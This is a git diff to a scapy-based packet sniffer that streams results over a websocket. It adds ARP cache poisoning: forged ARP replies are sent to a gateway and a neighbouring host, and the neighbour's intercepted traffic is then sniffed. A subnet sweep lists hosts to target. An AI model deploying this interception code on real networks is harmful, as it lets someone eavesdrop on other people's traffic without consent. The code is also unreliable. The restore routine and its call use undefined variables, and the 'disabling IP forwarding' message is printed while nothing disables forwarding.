@@ -2,6 +2,12 @@ import json
 from scapy.all import *
 import asyncio
 from urllib.parse import parse_qs, urlparse
+# ARP spoofing functions from From Justin Sietz https://nostarch.com/blackhatpython
+import os
+import signal
+import sys
+import threading
+import time
 
 def init():
     global packet_queue
@@ -17,7 +23,7 @@ def get_interface():
             'netif': a[0][3],
             'ifaddr': a[0][4],
         }
-        return interface_info
+        return json.dumps(interface_info)
 
     elif sys.platform == 'linux2':
         from scapy.arch.linux import get_if_list
@@ -43,15 +49,50 @@ def get_sniffer_config(config_from_client):
     updated_config = default_config
     return updated_config
 
-def get_neighbor_sniffer_config(config_from_client):
-    new_config = json.loads(config_from_client)
-    print(type(new_config))
-    print(new_config)
-    print(new_config['ifaddr'])
+def restore_network(gateway_ip, gateway_mac, neighbor_ip, neighbor_mac):
+    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
+    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
+    print("[*] Disabling IP forwarding")
+    os.kill(os.getpid(), signal.SIGTERM)
+
+def get_mac(ip_address):
+    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
+    for s,r in resp:
+        return r[ARP].hwsrc
+    return None
+
+def arp_spoof(config_from_client):
+    # json_config = json.loads(config_from_client)
+    neighbor_ip = config_from_client['args']['ifaddr']
+    network_info = json.loads(get_interface())
+    gateway_ip = network_info['gw']
+    neighbor_mac = get_mac(neighbor_ip)
+    gateway_mac = get_mac(gateway_ip)
+
+    print('neighbor_ip: {}'.format(neighbor_ip))
+    print('gateway_ip: {}'.format(gateway_ip))
+    print('neighbor_mac: {}'.format(neighbor_mac))
+    print('gateway_mac: {}'.format(gateway_mac))
+
+    try:
+        while True:
+            print('Sending ARP packets...')
+            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=neighbor_ip))
+            send(ARP(op=2, pdst=neighbor_ip, hwdst=neighbor_mac, psrc=gateway_ip))
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("[*] Stopped ARP poison attack. Restoring network")
+        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
+
+async def sniff_spoofed(neighbor_ip):
+    sniff_filter = 'ip host {}'.format(neighbor_ip)
+    while True:
+        print(f"[*] Starting network capture.")
+        sniff(prn=lambda x: x.summary(), filter=sniff_filter, iface=conf.iface)
 
 def update_config(key, default_config, new_config):
     try:
-        if new_config.get(key) is not None:
+        if new_config.get(key) and new_config.get(key) != '':
             print('Updating "%s" in default_config' % key)
             new_val = new_config.get(key)
             default_config.update({key: new_val})
@@ -64,31 +105,32 @@ def start_loop(loop):
     asyncio.set_event_loop(loop)
     loop.run_forever()
 
-def enqueue_packets(**kwargs):
-    k = kwargs['config']
+def enqueue_packets(config):
     def summarize(x):
         logger = 1
         pkt_summary = x.summary()
-        to_q = '{}--{}'.format(logger, pkt_summary)
-        # print(to_q)
-        packet_queue.put(to_q)
-    sniff(**k, prn=lambda x: summarize(x))
+        packet_queue.put(pkt_summary)
+    sniff(**config, prn=lambda x: summarize(x))
 
 async def dequeue_packets(ws):
     while True:
         logger = 2
         pkt_summary = packet_queue.get()
         if pkt_summary:
-            from_q = '{}--{}'.format(logger, pkt_summary)
-            # print(from_q)
-            await ws.send_str(from_q)
+            await ws.send_str(pkt_summary)
 
 def get_arp_table(ifaddr):
-    four_octets = ifaddr.get('ifaddr').split('.')
+    four_octets = ifaddr.split('.')
     del four_octets[-1]
     three_octets = '.'.join(four_octets)
     subnet = '{}{}'.format(three_octets, '.*')
     # http://redimp.de/posts/scapy-without-entering-promiscuous-mode/
     answered, unanswered = arping(subnet)
-    hosts = [(host[1].hwsrc, host[1].psrc) for host in answered]
+    hosts = {}
+    for index, host in enumerate(answered):
+        mac = host[1].hwsrc
+        ipAddr = host[1].psrc
+        hosts[index] = {}
+        hosts[index]['mac'] = mac
+        hosts[index]['ipAddr'] = ipAddr
     return json.dumps(hosts)
